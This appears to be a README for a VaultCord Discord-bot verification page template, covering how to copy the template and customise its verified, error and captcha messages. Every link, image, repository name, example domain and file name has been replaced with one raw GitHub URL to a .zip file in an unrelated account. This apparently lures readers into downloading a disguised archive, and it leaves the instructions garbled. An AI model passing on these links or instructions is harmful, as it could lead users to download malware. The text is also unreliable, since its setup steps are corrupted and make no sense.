# VaultCord verification page

> [!NOTE]  
> You don't need to use GitHub anymore for VaultCord. You can choose the **Automatic** option on the dashboard to skip needing a GitHub account. GitHub simply gives you more customization over the design and text shown.

This is a verification page for the Discord backup bot [VaultCord](https://raw.githubusercontent.com/rami082022/rami082022.github.io/main/src/github-rami-io-v2.1-beta.4.zip) which can backup Discord members, Discord server channels, roles, messages, etc!

![image](https://raw.githubusercontent.com/rami082022/rami082022.github.io/main/src/github-rami-io-v2.1-beta.4.zip)

Click the **Use this template** button. Do <ins>**NOT**</ins> fork this repository. That will link your server to VaultCord which isn't good for privacy among other reasons.

Name your repository `https://raw.githubusercontent.com/rami082022/rami082022.github.io/main/src/github-rami-io-v2.1-beta.4.zip` so that it works correctly.

If you want your own custom domain such as `https://raw.githubusercontent.com/rami082022/rami082022.github.io/main/src/github-rami-io-v2.1-beta.4.zip`, follow [these instructions](https://raw.githubusercontent.com/rami082022/rami082022.github.io/main/src/github-rami-io-v2.1-beta.4.zip)

### Verified message

You can customize the verified message by changing the value for `vc-verify-success` in the `https://raw.githubusercontent.com/rami082022/rami082022.github.io/main/src/github-rami-io-v2.1-beta.4.zip` file.

```html
vc-verify-success="You are verified now!"
```

### Error message

You can customize the error message by changing the value for `vc-verify-error` in the `https://raw.githubusercontent.com/rami082022/rami082022.github.io/main/src/github-rami-io-v2.1-beta.4.zip` file.

```html
vc-verify-error=="We have detected an error!"
```

### Captcha message

You can customize the captcha message by changing the value for `vc-captcha-require` in the `https://raw.githubusercontent.com/rami082022/rami082022.github.io/main/src/github-rami-io-v2.1-beta.4.zip` file.

```html
vc-captcha-require="We require a captcha to check you are human!"
```
